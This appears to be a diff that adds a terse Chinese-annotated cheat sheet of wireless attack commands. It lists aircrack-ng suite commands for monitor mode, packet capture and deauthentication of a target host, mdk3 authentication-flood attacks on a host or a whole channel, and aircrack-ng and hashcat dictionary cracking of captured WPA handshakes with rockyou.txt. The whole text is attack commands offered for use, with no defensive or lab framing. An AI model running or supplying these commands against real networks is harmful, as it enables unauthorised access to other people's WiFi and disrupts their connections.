@@ -1,0 +1,11 @@
+airmon-ng start [网卡接口]							                            将网卡转换为monitor模式
+airmon-ng stop [网卡接口]							                            停止网卡的monitor模式
+airodump [网卡接口]								                                监听网卡
+airodump-ng [网卡接口] -c [信道] --bssid [bssid] -w [包存放目录]		        抓取网络数据包
+aireplay-ng -deauth [反认证包数量] -a [网关] -c [目标MAC] [网卡接口]		    向目标主机发送反认证包
+aircrack-ng -a2 -b [bssid] -w [字典] [数据包]
+aircrack-ng [数据包] [-J [hccap文件]/-j [hccapx文件]]				            利用字典和数据包进行对比
+mdk3 [网卡接口] a -a [目标MAC]							                        验证洪水攻击目标主机
+mdk3 [网卡接口] d -c [信道] -w [白名单文件(MAC)]				                验证洪水攻击所有目标信道主机
+hashcat -m 2500 [hashcat数据包] [字典]
+hashcat -D 2 -a 0 -w 4 -T 1024 --force -m 2500 forcap.hccapx rockyou.txt
